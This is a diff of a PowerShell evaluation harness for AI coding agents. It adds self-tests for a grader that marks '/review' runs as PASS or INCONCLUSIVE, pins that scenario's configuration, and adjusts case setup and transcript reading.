+    & $check 'a budget cut' (& $grade (& $stream -Subtype 'error_max_budget_usd' -Final (& $report))) 'INCONCLUSIVE' '^valid=False reason=budget cut '
+    & $check 'no verdict' (& $grade (& $stream -Final (& $report -Verdict '### Notes'))) 'INCONCLUSIVE' '^valid=False reason=no verdict '
+    & $check 'no permission log' (& $grade (& $stream -Final (& $report)) $null) 'INCONCLUSIVE' '^valid=False reason=no permission log '
+    & $check 'a reviewer stub with no notification' (& $grade (& $stream -Stub @('debt-radar') -Final (& $report))) 'INCONCLUSIVE' '^valid=False reason=reviewers missing: debt-radar '
+    $noted = & $stream -Stub @('debt-radar') -Final (& $report)
+    $noted.Events.Insert($noted.Events.Count - 1, [pscustomobject]@{ type = 'system'; subtype = 'task_notification'; tool_use_id = 't-debt-radar'; status = 'completed'; summary = 'debt-radar: DEBT-006 touches the changed tests' })
+    & $check 'a reviewer stub completed by its notification' (& $grade $noted) 'PASS' '^valid=True reason=none '
+    # The row status the live loop writes.
+    $good = & $grade (& $stream -Final (& $report))
+    if ((Get-CaseStatus -AgentExit 0 -Evidence $good -Transcript (& $stream -Final (& $report))) -cne 'PASS' -or (Get-CaseStatus -AgentExit 0 -Evidence (& $grade (& $stream -Dispatched $names[0..4] -Returned $names[0..4] -Final (& $report))) -Transcript (& $stream -Final (& $report))) -cne 'INCONCLUSIVE') { throw 'B-467 grader: a valid run is not PASS or an invalid run is not INCONCLUSIVE in the row status' }
+    # The scenario: pinned.
+    $cases = @((Get-Content -Raw $scenarioPath | ConvertFrom-Json).scenarios | Where-Object { $_.id -eq 'b467-review' })
+    if ($cases.Count -ne 1) { throw "B-467 scenarios.json holds $($cases.Count) b467-review entries" }
+    $c = $cases[0]
+    if ([string]$c.prompt -cne '/review' -or -not ([string]$c.fixture).Equals('orders-v2') -or -not ([string]$c.overlay).Equals('b514-orders') -or [string]$c.subject -cne 'b467-review' -or [decimal]$c.budgetUsd -ne [decimal]1 -or -not $c.completeReview -or [string]$c.assertion -cne 'reviewRun' -or $c.dialog -or $c.followUp -or $c.bareArm -or $c.overlayPatch) { throw 'B-467 the b467-review scenario is not the pinned /review run (prompt /review, orders-v2, b514-orders, the b467-review subject, 1.00 USD, completeReview, reviewRun, no dialog, followUp or overlay patch)' }
+    Write-Output 'PASS: B-467 the grader reads the final merged report against the plan''s fixed per-defect patterns (file stem without .cs, D8 on DEBT-006), counts invented findings without scoring them, and reads a run invalid when a reviewer is missing or returned no report, any reply says CANNOT EXAMINE, a permission was denied, the run was cut by its budget, or there is no verdict or permission log'
 }
 
 # B-537 (.claude/plans/2026-11-19-b537-address-review-comments.md section 5): the review-comments layer and its three arms are what the plan
@@ -7770,6 +8346,11 @@ function Invoke-WarehouseScaleSelfTest([string]$Temp) {
 function Invoke-SelfTest {
     $temp =Join-Path ([IO.Path]::GetTempPath()) ('b41-selftest-' + [guid]::NewGuid().ToString('N'))
     try {
+        New-Item -ItemType Directory -Path $temp -Force | Out-Null
+        Invoke-ReviewRunGradeSelfTest $temp
+        Invoke-ReviewPermissionSelfTest
+        $b467Temp = $temp + '-b467'
+        try { Invoke-ReviewRunSelfTest $b467Temp } finally { Remove-Item -LiteralPath $b467Temp -Recurse -Force -ErrorAction SilentlyContinue }
         New-EvalRepo $temp
         if (-not (Test-Path (Join-Path $temp 'src/Calculator.cs'))) { throw 'fixture source missing' }
         $transcriptPath = Join-Path $temp 'synthetic.jsonl'
@@ -10280,7 +10861,8 @@ JOIN dim.DimCarrier AS c ON c.CarrierDurableKey = f.CarrierDurableKey
         if ($sa.Count -ne 1) { throw "B-516: scenarios.json holds $($sa.Count) skill-approve entries" }
         $sa = $sa[0]
         if ([string]$sa.prompt -cne 'Approve the add-report-export skill.' -or [string]$sa.approveSkill -cne 'add-report-export' -or (@($sa.allowWrite) -join '|') -cne '.claude/skills/add-report-export/|AGENTS.md' -or [string]$sa.assertion -cne 'skillApprove' -or [string]$sa.overlay -cne 'b514-orders' -or -not ([string]$sa.fixture).Equals('orders-v2') -or $sa.bareArm -or $sa.overlayPatch -or $sa.dialog -or $sa.followUp -or $sa.completeReview -or [decimal]$sa.budgetUsd -ne [decimal]1.5) { throw 'B-516: skill-approve is not the pinned prompt, slug, allowWrite, oracle, overlay, fixture and 1.50 USD budget, framework arm only, one prompt' }
-        foreach ($saOther in @($saAll | Where-Object { $_.id -ne 'skill-approve' })) {
+        # B-467 R2: b467-review is the other control-channel case with no dialog field of its own (pick none, Invoke-ReviewRunSelfTest).
+        foreach ($saOther in @($saAll | Where-Object { $_.id -notin @('skill-approve', 'b467-review') })) {
             if ($saOther.PSObject.Properties['allowWrite'] -or $saOther.PSObject.Properties['approveSkill'] -or [string]$saOther.assertion -eq 'skillApprove') { throw "B-516: $($saOther.id) carries the skill-approve allow class or oracle" }
             foreach ($saEx in @('claude', 'copilot')) { if ((Get-DialogPick $saOther $saEx) -cne [string]$saOther.dialog) { throw "B-516: $($saOther.id)'s control-channel pick on $saEx is not its own dialog field" } }
         }
@@ -10401,8 +10983,13 @@ function Invoke-EvalCases($Cases, $Rows) {
             # Before the scenario setup, which commits the framework files in the warehouse cases:
             # the patch adds no commit, so `git log` (session-start preloads it) matches both arms.
             # B-402: under -WarehouseMap generated|partial it lands inside that setup, after the bootstrap overlay.
-            if ($TargetPatch -and $WarehouseMap -notin @('generated','partial')) { Invoke-TargetPatch $target $TargetPatch | Out-Null }
+            # B-467 R2: a /review case with a subject commits the patch itself (Initialize-ReviewSubject), so the review sees the subject alone.
+            if ($TargetPatch -and $WarehouseMap -notin @('generated','partial') -and -not $case.subject) { Invoke-TargetPatch $target $TargetPatch | Out-Null }
             $before = [int](git -C $target rev-list --count HEAD)
+        }
+        if ($case.subject) {
+            if ($Arm -ne 'framework') { throw "$($case.id): the /review subject runs on the framework arm." }
+            $before = Initialize-ReviewSubject $target (Join-Path $repo "meta/eval-fixtures/$($case.subject)/subject") $TargetPatch
         }
         $archivedRoot = ''
         switch ($case.id) {
@@ -10575,7 +11162,7 @@ Issue: Boundary behavior lacks a direct compiled unit test.
             }
             # B-406: a background security pass makes the stream several turns of one session; no other case reads that.
             # B-514: the skill-use cases add an endpoint, so a background security pass can make their stream multi-turn too.
-            $transcript = Read-Transcript $transcriptPath -AllowMultiTurn:($caseFixture -in $contractFixtures -or $case.assertion -in @('skillUse', 'reportWrite', 'reportProc', 'optionsPlan', 'recordOffer', 'reviewOffer', 'unansweredGo', 'businessTerm', 'reviewComments'))
+            $transcript = Read-Transcript $transcriptPath -AllowMultiTurn:($caseFixture -in $contractFixtures -or $case.assertion -eq 'reviewRun' -or $case.assertion -in @('skillUse', 'reportWrite', 'reportProc', 'optionsPlan', 'recordOffer', 'reviewOffer', 'unansweredGo', 'businessTerm', 'reviewComments'))
             if ($dialogPick -and $Executor -eq 'claude') { $transcript | Add-Member -NotePropertyName Permissions -NotePropertyValue @($run.Permissions) -Force; $transcript | Add-Member -NotePropertyName ReviewConfirm -NotePropertyValue ([string]$run.ReviewConfirm) -Force }
             if ($legSession) {
                 # B-410: the developer's answer, only when the first leg stopped for it: no write (a Write-type tool or a changed
